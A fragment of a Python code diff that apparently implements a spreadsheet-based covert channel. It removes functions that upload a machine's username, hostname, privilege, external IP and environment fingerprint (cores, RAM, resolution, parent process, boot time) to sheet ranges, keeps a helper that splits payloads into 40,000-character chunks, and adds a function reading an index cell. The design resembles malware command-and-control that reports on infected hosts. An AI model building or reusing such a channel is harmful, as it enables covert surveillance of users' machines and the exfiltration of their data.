@@ -93,29 +93,6 @@ def _insert_data(data):
     else:
         print(res.text)
 
-def insert_data_basic_info(index,send_time,privilege,username,hostname,external_ip):
-    
-    data = {
-        "valueRange": {
-            "range": f"{sheet_id}!A{index}:E20",
-            "values": [
-                [send_time, privilege, username, hostname, external_ip],
-            ]
-        }
-    }   
-    _insert_data(data)
-    
-def insert_data_env_info(index,core_num, ram, resolution, current_path, parent_process, boot_time):
-    
-    data = {
-        "valueRange": {
-            "range": f"{sheet_id}!G{index}:L20",
-            "values": [
-                [core_num, ram, resolution, current_path, parent_process, boot_time],
-            ]
-        }
-    }   
-    _insert_data(data)
 
 def split_payload(payload):
     length = (len(payload) + 39999) // 40000  
@@ -213,3 +190,7 @@ def fetch_data_basic_info(index) -> json:
 def fetch_data_env_info(index) -> json:
     return _fetch_data(f"G{index}:L{index}")
 
+def fetch_data_index():
+    data = _fetch_data("A51:A51")
+    print(data)
+    return data[0][0]
